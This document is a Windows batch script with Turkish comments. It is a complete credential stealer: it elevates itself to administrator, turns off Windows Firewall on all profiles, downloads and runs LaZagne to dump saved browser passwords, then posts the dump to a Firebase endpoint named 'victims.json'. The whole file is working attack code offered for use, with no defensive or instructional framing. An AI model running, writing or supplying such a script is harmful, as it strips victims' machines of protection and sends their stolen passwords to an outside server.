@echo off
:: Yönetici yetkisi kontrolü
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Yönetici yetkisi gerekli. Yeniden çalıştırılıyor...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: FIREWALL kapatma
echo [*] Windows Firewall kapatılıyor...
netsh advfirewall set allprofiles state off

:: Geçici klasöre geç
cd /d %TEMP%

:: Lazagne indir (EXE versiyonu)
echo [*] Lazagne indiriliyor...
curl -L -o lazagne.exe https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe

:: Lazagne çalıştır ve çıktıyı kaydet
echo [*] Lazagne çalıştırılıyor...
lazagne.exe browsers -oN -output results

:: Sonucu oku
setlocal enabledelayedexpansion
set FILE=results\browsers.txt
set DATA=
for /f "usebackq delims=" %%A in ("%FILE%") do (
    set "line=%%A"
    set "DATA=!DATA!!line!%0A%"
)

:: Firebase'e veri gönder
echo [*] Firebase'e veri gönderiliyor...
powershell -Command ^
  "$json = '{\"logs\": \"' + [System.Web.HttpUtility]::UrlEncode($env:DATA) + '\"}';" ^
  "Invoke-RestMethod -Uri '%FB_BASE%/victims.json' -Method POST -Body $json -ContentType 'application/json'"

echo [*] Tüm işlemler tamamlandı.
pause
